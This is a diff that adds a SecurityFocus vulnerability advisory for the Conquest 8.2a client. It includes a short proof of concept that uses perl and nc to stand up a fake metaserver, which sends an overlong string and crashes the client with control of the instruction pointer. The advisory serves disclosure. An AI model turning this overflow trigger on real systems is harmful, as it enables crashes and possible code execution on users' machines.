@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/22855/info
+
+Conquest is prone to multiple remotely exploitable vulnerabilities, including a stack-based buffer-overflow vulnerability and a memory-corruption vulnerability.
+
+An attacker can exploit these issues to execute arbitrary code within the context of the affected application or cause the affected application to crash, denying service to legitimate users.
+
+These issues affect version 8.2a; prior versions may also be affected. 
+
+1. Launch a fake metaserver that sends more than 1024 chars:
+perl -e 'print "a"x1200' | nc -l -p 1700 -v -v -n
+
+2. Launch the client, specifying the alternate metaserver:
+conquest -m -M 127.0.0.1
+
+3. Interrupt the fake metaserver: conquest should have been crashed
+trying to executing the code at offset 0x61616161 
